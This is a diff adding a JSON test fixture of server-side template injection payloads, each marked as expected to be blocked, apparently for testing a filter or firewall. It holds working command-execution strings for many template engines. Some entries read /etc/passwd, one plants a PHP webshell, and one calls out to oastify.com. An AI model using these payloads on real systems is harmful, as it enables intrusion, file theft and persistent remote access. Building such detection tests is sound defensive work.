@@ -1,0 +1,191 @@
+[
+    {
+      "id": "ssti-twig-001",
+      "payload": "{{['id']|filter('system')}}",
+      "tags": ["ssti", "twig", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Twig RCE via filter callback",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-twig-002",
+      "payload": "{{[0]|reduce('system','id')}}",
+      "tags": ["ssti", "twig", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Twig RCE via reduce callback",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-twig-003",
+      "payload": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+      "tags": ["ssti", "twig", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Twig RCE via undefined filter callback (older versions)",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-twig-004",
+      "payload": "{{'/etc/passwd'|file_excerpt(1,30)}}",
+      "tags": ["ssti", "twig", "php", "lfi"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Twig file read via file_excerpt filter",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-blade-001",
+      "payload": "{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}",
+      "tags": ["ssti", "blade", "laravel", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Laravel Blade RCE via chr obfuscation",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-smarty-001",
+      "payload": "{php}echo `id`;{/php}",
+      "tags": ["ssti", "smarty", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Smarty PHP tag RCE (older versions)",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-smarty-002",
+      "payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
+      "tags": ["ssti", "smarty", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Smarty write webshell to file",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-latte-001",
+      "payload": "{php system('nslookup oastify.com')}",
+      "tags": ["ssti", "latte", "php", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Latte template RCE",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-freemarker-001",
+      "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+      "tags": ["ssti", "freemarker", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Freemarker RCE via Execute utility",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-freemarker-002",
+      "payload": "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
+      "tags": ["ssti", "freemarker", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Freemarker RCE alternate syntax",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-freemarker-003",
+      "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+      "tags": ["ssti", "freemarker", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Freemarker RCE compact syntax",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-velocity-001",
+      "payload": "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
+      "tags": ["ssti", "velocity", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Velocity RCE via Runtime class",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-velocity-002",
+      "payload": "#set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))#set($chr=$s.class.forName('java.lang.Character'))#set($str=$s.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+      "tags": ["ssti", "velocity", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Velocity RCE with output",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-pug-001",
+      "payload": "#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}",
+      "tags": ["ssti", "pug", "jade", "nodejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Pug/Jade RCE via process.mainModule",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-pug-002",
+      "payload": "- global.process.mainModule.require('child_process').execSync('id').toString()",
+      "tags": ["ssti", "pug", "jade", "nodejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Pug RCE via global.process",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-ejs-001",
+      "payload": "<%- global.process.mainModule.require('child_process').execSync('id').toString() %>",
+      "tags": ["ssti", "ejs", "nodejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "EJS RCE via global.process",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-nunjucks-001",
+      "payload": "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}",
+      "tags": ["ssti", "nunjucks", "nodejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Nunjucks RCE via constructor trick",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-handlebars-001",
+      "payload": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}",
+      "tags": ["ssti", "handlebars", "nodejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Handlebars RCE via prototype chain",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-groovy-001",
+      "payload": "${'id'.execute().text}",
+      "tags": ["ssti", "groovy", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Groovy GString RCE",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-spel-001",
+      "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "tags": ["ssti", "spel", "spring", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Spring Expression Language RCE",
+      "category": "Injection"
+    },
+    {
+      "id": "ssti-jinjava-001",
+      "payload": "{{'a]'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('id')\\\"}}",
+      "tags": ["ssti", "jinjava", "java", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Jinjava (HubSpot) RCE via JavaScript engine",
+      "category": "Injection"
+    }
+]
